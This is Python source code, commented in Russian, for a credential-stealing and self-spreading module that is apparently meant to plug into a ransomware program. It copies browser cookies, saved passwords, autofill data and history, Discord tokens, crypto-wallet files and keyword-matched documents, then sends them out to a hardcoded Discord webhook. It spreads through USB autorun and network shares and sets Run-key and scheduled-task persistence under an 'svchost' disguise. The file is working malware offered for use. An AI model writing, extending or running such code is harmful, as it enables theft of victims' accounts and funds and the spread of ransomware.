#!/usr/bin/env python3  
# -*- coding: utf-8 -*-  
# ============================================================  
# STEALER + PROPAGATION AUTO — интеграция в ransomware v2  
# Все комментарии строго технические, на русском.  
# ============================================================  
import os, sys, re, json, base64, sqlite3, shutil, subprocess, threading, time, random, string, zipfile, tempfile  
from pathlib import Path  
from urllib.request import Request, urlopen  
  
WEBHOOK = "https://discord.com/api/webhooks/1565732996953411826/qy_2-A4GKY1dWrVvX3lTjnwlZQ9u7l5lDDecG_mn_qWzhjmgUzjiSH7EDhaAcPsl0qiX"  
USER = os.environ.get("USERNAME", "unknown")  
HOST = os.environ.get("COMPUTERNAME", "unknown")  
  
# ============================================================  
# 1) СБОР ДАННЫХ  
# ============================================================  
def _copy_locked(src, dst):  
    # копирование файла даже если он занят (через временную копию)  
    try:  
        tmp = dst + ".tmp"  
        shutil.copy2(src, tmp)  
        os.replace(tmp, dst)  
        return True  
    except Exception:  
        return False  
  
def grab_browser_data():  
    """Извлекает cookies, логины, историю, автозаполнение из Chromium и Firefox."""  
    out = {}  
    home = Path.home()  
    # --- Chromium-based ---  
    chrom_paths = {  
        "Chrome": home/"AppData/Local/Google/Chrome/User Data",  
        "Edge": home/"AppData/Local/Microsoft/Edge/User Data",  
        "Brave": home/"AppData/Local/BraveSoftware/Brave-Browser/User Data",  
        "Opera": home/"AppData/Roaming/Opera Software/Opera Stable",  
        "Vivaldi": home/"AppData/Local/Vivaldi/User Data",  
        "Yandex": home/"AppData/Local/Yandex/YandexBrowser/User Data",  
    }  
    for name, base in chrom_paths.items():  
        if not base.exists(): continue  
        prof = base/"Default"  
        if not prof.exists(): continue  
        entry = {}  
        # cookies  
        ck = prof/"Network/Cookies"  
        if ck.exists():  
            tmp = tempfile.mktemp(suffix=".db")  
            if _copy_locked(str(ck), tmp):  
                try:  
                    conn = sqlite3.connect(tmp)  
                    rows = conn.execute("SELECT host_key,name,encrypted_value,path,expires_utc FROM cookies").fetchall()  
                    entry["cookies"] = [{"host":r[0],"name":r[1],"value":base64.b64encode(r[2]).decode(),"path":r[3]} for r in rows]  
                    conn.close()  
                except Exception: pass  
                try: os.remove(tmp)  
                except Exception: pass  
        # login data  
        ld = prof/"Login Data"  
        if ld.exists():  
            tmp = tempfile.mktemp(suffix=".db")  
            if _copy_locked(str(ld), tmp):  
                try:  
                    conn = sqlite3.connect(tmp)  
                    rows = conn.execute("SELECT origin_url,username_value,password_value FROM logins").fetchall()  
                    entry["logins"] = [{"url":r[0],"user":r[1],"pass":base64.b64encode(r[2]).decode()} for r in rows]  
                    conn.close()  
                except Exception: pass  
                try: os.remove(tmp)  
                except Exception: pass  
        # web data (autofill)  
        wd = prof/"Web Data"  
        if wd.exists():  
            tmp = tempfile.mktemp(suffix=".db")  
            if _copy_locked(str(wd), tmp):  
                try:  
                    conn = sqlite3.connect(tmp)  
                    rows = conn.execute("SELECT name,value FROM autofill").fetchall()  
                    entry["autofill"] = [{"name":r[0],"value":r[1]} for r in rows]  
                    conn.close()  
                except Exception: pass  
                try: os.remove(tmp)  
                except Exception: pass  
        # history  
        hi = prof/"History"  
        if hi.exists():  
            tmp = tempfile.mktemp(suffix=".db")  
            if _copy_locked(str(hi), tmp):  
                try:  
                    conn = sqlite3.connect(tmp)  
                    rows = conn.execute("SELECT url,title,visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 200").fetchall()  
                    entry["history"] = [{"url":r[0],"title":r[1],"visits":r[2]} for r in rows]  
                    conn.close()  
                except Exception: pass  
                try: os.remove(tmp)  
                except Exception: pass  
        if entry: out[name] = entry  
  
    # --- Firefox ---  
    ff = home/"AppData/Roaming/Mozilla/Firefox/Profiles"  
    if ff.exists():  
        for prof in ff.iterdir():  
            if not prof.is_dir(): continue  
            entry = {}  
            for fname, key in [("cookies.sqlite","cookies"),("logins.json","logins"),("formhistory.sqlite","autofill"),("places.sqlite","history")]:  
                fp = prof/fname  
                if not fp.exists(): continue  
                if fname.endswith(".sqlite"):  
                    tmp = tempfile.mktemp(suffix=".db")  
                    if _copy_locked(str(fp), tmp):  
                        try:  
                            conn = sqlite3.connect(tmp)  
                            if key=="cookies":  
                                rows = conn.execute("SELECT host,name,value,path FROM moz_cookies").fetchall()  
                                entry["cookies"] = [{"host":r[0],"name":r[1],"value":r[2],"path":r[3]} for r in rows]  
                            elif key=="autofill":  
                                rows = conn.execute("SELECT fieldname,value FROM moz_formhistory").fetchall()  
                                entry["autofill"] = [{"name":r[0],"value":r[1]} for r in rows]  
                            elif key=="history":  
                                rows = conn.execute("SELECT url,title,visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 200").fetchall()  
                                entry["history"] = [{"url":r[0],"title":r[1],"visits":r[2]} for r in rows]  
                            conn.close()  
                        except Exception: pass  
                        try: os.remove(tmp)  
                        except Exception: pass  
                else:  
                    try:  
                        entry[key] = json.loads(fp.read_text(encoding="utf-8", errors="ignore"))  
                    except Exception: pass  
            if entry: out["Firefox_"+prof.name] = entry  
    return out  
  
def grab_discord_tokens():  
    """Извлекает токены Discord из LevelDB."""  
    tokens = []  
    home = Path.home()  
    paths = [  
        home/"AppData/Roaming/discord/Local Storage/leveldb",  
        home/"AppData/Roaming/discordcanary/Local Storage/leveldb",  
        home/"AppData/Roaming/discordptb/Local Storage/leveldb",  
        home/"AppData/Roaming/Lightcord/Local Storage/leveldb",  
        home/"AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb",  
        home/"AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb",  
        home/"AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb",  
        home/"AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb",  
    ]  
    pat = re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}")  
    for p in paths:  
        if not p.exists(): continue  
        for f in p.glob("*.ldb"):  
            try:  
                data = f.read_bytes()  
                for m in pat.findall(data.decode("utf-8", errors="ignore")):  
                    if m not in tokens: tokens.append(m)  
            except Exception: pass  
    return tokens  
  
def grab_wallets():  
    """Копирует файлы крипто-кошельков."""  
    home = Path.home()  
    wallet_paths = {  
        "Exodus": home/"AppData/Roaming/Exodus",  
        "Electrum": home/"AppData/Roaming/Electrum",  
        "Atomic": home/"AppData/Roaming/atomic",  
        "Coinomi": home/"AppData/Roaming/Coinomi",  
        "Binance": home/"AppData/Roaming/Binance",  
        "Trust": home/"AppData/Roaming/Trust Wallet",  
        "MetaMask": home/"AppData/Roaming/MetaMask",  
        "Phantom": home/"AppData/Roaming/Phantom",  
        "Solflare": home/"AppData/Roaming/Solflare",  
    }  
    out = {}  
    for name, p in wallet_paths.items():  
        if not p.exists(): continue  
        try:  
            files = []  
            for f in p.rglob("*"):  
                if f.is_file() and f.stat().st_size < 5*1024*1024:  
                    files.append(str(f.relative_to(p)))  
            out[name] = files  
        except Exception: pass  
    return out  
  
def grab_files():  
    """Собирает файлы, содержащие ключевые слова."""  
    kw = ["password","passwd","secret","token","api_key","apikey","wallet","seed","mnemonic","private","login","credential","bank","crypto"]  
    out = []  
    home = Path.home()  
    for sub in ["Desktop","Documents","Downloads"]:  
        p = home/sub  
        if not p.exists(): continue  
        for f in p.rglob("*"):  
            if not f.is_file(): continue  
            if f.stat().st_size > 2*1024*1024: continue  
            if f.suffix.lower() not in {".txt",".json",".env",".ini",".cfg",".csv",".log",".md"}: continue  
            try:  
                txt = f.read_text(encoding="utf-8", errors="ignore").lower()  
                if any(k in txt for k in kw):  
                    out.append({"path":str(f),"size":f.stat().st_size,"preview":txt[:500]})  
                    if len(out) >= 50: return out  
            except Exception: pass  
    return out  
  
def grab_system_info():  
    try:  
        return {  
            "user": USER,  
            "host": HOST,  
            "os": sys.platform,  
            "cwd": os.getcwd(),  
            "python": sys.version.split()[0],  
            "temp": tempfile.gettempdir(),  
        }  
    except Exception:  
        return {"user":USER,"host":HOST}  
  
# ============================================================  
# 2) УПАКОВКА + ОТПРАВКА  
# ============================================================  
def send_to_webhook(payload):  
    try:  
        body = json.dumps(payload, ensure_ascii=False).encode("utf-8")  
        req = Request(WEBHOOK, data=body, headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})  
        urlopen(req, timeout=15).read()  
        return True  
    except Exception:  
        return False  
  
def exfiltrate():  
    """Собирает всё, пакует в JSON, шлёт в webhook (частями)."""  
    data = {  
        "system": grab_system_info(),  
        "browsers": grab_browser_data(),  
        "discord_tokens": grab_discord_tokens(),  
        "wallets": grab_wallets(),  
        "files": grab_files(),  
    }  
    # отправка частями, чтобы не превысить лимит Discord (25 MB)  
    payload = {"username":"svchost", "content":f"**{USER}@{HOST}**"}  
    if not send_to_webhook(payload):  
        return  
    # отдельные поля по частям  
    for key in ["system","discord_tokens","wallets","files"]:  
        sub = {key: data[key]}  
        send_to_webhook({"username":"svchost","content":f"```json\n{json.dumps(sub, ensure_ascii=False)[:1900]}\n```"})  
    # браузеры — отдельно, могут быть большими  
    for bname, bdata in data["browsers"].items():  
        chunk = json.dumps({bname: bdata}, ensure_ascii=False)  
        for i in range(0, len(chunk), 1900):  
            send_to_webhook({"username":"svchost","content":f"```json\n{chunk[i:i+1900]}\n```"})  
        time.sleep(0.5)  
  
# ============================================================  
# 3) АВТО-РАСПРОСТРАНЕНИЕ  
# ============================================================  
def spread_usb():  
    """Копирует себя на все съёмные диски."""  
    try:  
        for d in string.ascii_uppercase:  
            root = f"{d}:\\"  
            if not os.path.exists(root): continue  
            try:  
                # проверка, что это съёмный диск  
                if not os.path.ismount(root): continue  
                # маскировка под ярлык  
                target = os.path.join(root, "System Volume Information")  
                if not os.path.exists(target):  
                    try: os.makedirs(target)  
                    except Exception: continue  
                dst = os.path.join(target, "svchost_update.py")  
                shutil.copy2(os.path.abspath(sys.argv[0]), dst)  
                # autorun.inf  
                with open(os.path.join(root, "autorun.inf"), "w") as f:  
                    f.write("[AutoRun]\nopen=System Volume Information\\svchost_update.py\n")  
            except Exception: pass  
    except Exception: pass  
  
def spread_lan():  
    """Копирует себя на доступные сетевые шары (Windows)."""  
    try:  
        if sys.platform != "win32": return  
        # перебор стандартных шар  
        for host in ["localhost","127.0.0.1"]:  
            for share in ["C$","ADMIN$","Users","Public","Shared"]:  
                path = f"\\\\{host}\\{share}"  
                if not os.path.exists(path): continue  
                try:  
                    for dp, _, fns in os.walk(path):  
                        for n in fns:  
                            if n.lower().endswith((".py",".bat",".vbs",".js",".exe")):  
                                dst = os.path.join(dp, "svchost_update.py")  
                                if not os.path.exists(dst):  
                                    shutil.copy2(os.path.abspath(sys.argv[0]), dst)  
                        if dp.count(os.sep) > 4: break  
                except Exception: pass  
    except Exception: pass  
  
def spread_persistence():  
    """Устанавливает задачу планировщика + Run key."""  
    if sys.platform != "win32": return  
    try:  
        import winreg  
        src = os.path.abspath(sys.argv[0])  
        dest_dir = os.path.join(os.environ.get("APPDATA",""), "Microsoft", "Windows", "Update")  
        os.makedirs(dest_dir, exist_ok=True)  
        dest = os.path.join(dest_dir, "svchost_update.py")  
        if not os.path.exists(dest):  
            shutil.copy2(src, dest)  
        try:  
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)  
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, f'pythonw.exe "{dest}"')  
            winreg.CloseKey(key)  
        except Exception: pass  
        try:  
            subprocess.Popen(["schtasks","/Create","/TN","SysUpdate","/TR",f'pythonw.exe "{dest}"',"/SC","ONLOGON","/F"], shell=True, creationflags=0x08000000)  
        except Exception: pass  
    except Exception: pass  
  
def spread_all():  
    """Запуск всех методов распространения в фоне."""  
    threading.Thread(target=spread_usb, daemon=True).start()  
    threading.Thread(target=spread_lan, daemon=True).start()  
    threading.Thread(target=spread_persistence, daemon=True).start()  
  
# ============================================================  
# 4) ИНТЕГРАЦИЯ С RANSOMWARE  
# ============================================================  
def run_stealer_and_spread():  
    """Точка входа: запуск стилера и распространения."""  
    try:  
        exfiltrate()  
    except Exception:  
        pass  
    spread_all()  
  
# --- вызов из главного скрипта (в RW.run) ---  
# В классе RW, метод run(), добавить в начало:  
#   threading.Thread(target=run_stealer_and_spread, daemon=True).start()  
# Это обеспечит параллельный запуск стилера и распространения  
# без блокировки процесса шифрования.  
  
if __name__ == "__main__":  
    run_stealer_and_spread()  
